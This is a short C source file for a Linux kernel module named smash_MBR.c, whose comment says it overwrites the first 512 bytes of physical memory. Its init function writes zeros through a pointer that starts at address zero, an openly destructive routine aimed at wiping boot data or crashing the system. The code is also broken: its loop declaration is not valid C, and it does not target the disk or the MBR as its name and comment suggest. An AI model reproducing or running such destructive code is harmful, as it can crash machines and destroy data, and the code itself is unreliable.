/*  
 *  smash_MBR.c - overwrite frist 512 byte on physical memory
 */
#include <linux/module.h>	/* Needed by all modules */
#include <linux/kernel.h>	/* Needed for KERN_INFO */

static int __init sma_hello(void)
{
	size_t * ptr = 0;
	while (size_t ++i <= 512)
	{
		*ptr = 0;
		++ptr;
		printk("X");
	}
	return 0;
}

static void __exit sma_bye(void)
{
	printk(KERN_INFO "Goodbye world 2.\n");
}

module_init(sma_hello);
module_exit(sma_bye);

MODULE_LICENSE("GPL");